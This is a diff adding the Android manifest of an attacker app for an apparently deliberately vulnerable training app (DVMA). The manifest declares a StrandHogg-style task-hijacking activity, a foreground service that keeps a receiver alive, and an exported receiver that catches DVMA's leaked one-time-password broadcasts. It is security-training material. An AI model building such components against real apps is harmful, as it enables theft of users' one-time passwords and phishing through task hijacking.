@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- FOR AUTHORIZED SECURITY-TRAINING USE ONLY.
+     com.dvma.attacker: a separate, unprivileged app that harvests data a
+     vulnerable DVMA leaks across the process boundary. It requests NO special
+     permissions - that is the point. -->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <!-- Foreground service so the runtime receiver stays alive while DVMA (not
+         this app) is foreground. Android 8+ blocks implicit-broadcast delivery
+         to manifest receivers, so a real co-resident attacker keeps a resident
+         runtime receiver exactly this way. -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- Package visibility (Android 11+): the attacker must be able to resolve
+         DVMA to bind its exported service by explicit component. -->
+    <queries>
+        <package android:name="com.dvma" />
+    </queries>
+
+    <application
+        android:allowBackup="false"
+        android:label="DVMA Attacker"
+        android:theme="@android:style/Theme.Material.Light">
+
+        <!-- Tiny UI that starts the harvest service and shows captures. -->
+        <activity
+            android:name=".AttackerActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- activity_task_stack_hijacking (StrandHogg): declares DVMA's task
+             affinity + allowTaskReparenting so it can land in DVMA's task. -->
+        <activity
+            android:name=".HijackActivity"
+            android:exported="true"
+            android:taskAffinity="com.dvma"
+            android:allowTaskReparenting="true" />
+
+        <!-- Long-running service that holds the runtime OtpLeakReceiver. -->        <service
+            android:name=".OtpHarvestService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="security-training cross-app broadcast harvest demo" />
+        </service>
+
+        <!-- Also declare a manifest receiver for the unprotected DVMA action so
+             an explicit `am broadcast` from the harness reaches it directly. -->
+        <receiver
+            android:name=".OtpLeakReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.dvma.action.OTP_ISSUED" />
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
